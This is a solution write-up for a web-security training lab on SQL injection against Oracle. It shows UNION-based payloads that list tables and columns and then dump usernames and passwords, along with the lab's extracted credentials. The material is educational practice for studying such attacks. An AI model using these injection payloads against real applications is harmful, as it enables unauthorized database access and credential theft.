# Lab: SQL injection attack, listing the database contents on Oracle

### Instructions

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

### Solution

Testing the `category` parameter, we find there are two columns:

```sql
filter?category=Pets' UNION SELECT null,null FROM dual--
```

We can view the tables with:

```sql
/filter?category=Pets' UNION SELECT null,table_name FROM all_tables--
```

```
<SNIP>
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
USERS_TFCMMU
WRI$_ADV_ASA_RECO_DATA
WRR$_REPLAY_CALL_FILTER
<SNIP>
```

The table `USERS_TFCMMU` seems interesting.

Let's query the column names:

```sql
/filter?category=Pets' UNION SELECT null,column_name FROM all_tab_columns WHERE table_name='USERS_TFCMMU'--
```

This returns:

```
EMAIL
PASSWORD_UPTFJV
USERNAME_AZSJZK
```

Armed with the column names we can then extract data with:

```sql
/filter?category=Pets' UNION SELECT null,USERNAME_AZSJZK || ':' || PASSWORD_UPTFJV FROM USERS_TFCMMU--
```

Which returns:

```
administrator:98ofnuzjibbkevm68e4q
carlos:p2svtzv5vg0jl70nqijf
wiener:q56wgjxr00j6jctxo432
```

We can login with the administrator password to finish the lab.